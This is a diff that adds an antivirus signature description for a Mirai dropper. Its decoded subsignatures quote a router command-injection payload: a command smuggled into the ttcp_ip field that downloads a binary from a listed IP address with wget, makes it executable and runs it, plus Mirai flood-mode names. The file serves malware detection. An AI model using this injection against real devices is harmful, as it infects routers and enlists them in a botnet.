@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Dropper.Mirai-7135831-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: 0&1&2&3&4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+linksys.cloudbot%3B+wget+http%3A%2F%2F147.135.124.113%2Fbins%2Flinksys.cloudbot%3B+chmod+777+l
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+inksys.cloudbot%3B+.%2Flinksys.cloudbot+linksys.cloudbot%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+0&StartEPI=1
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+udpplain
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+udprand
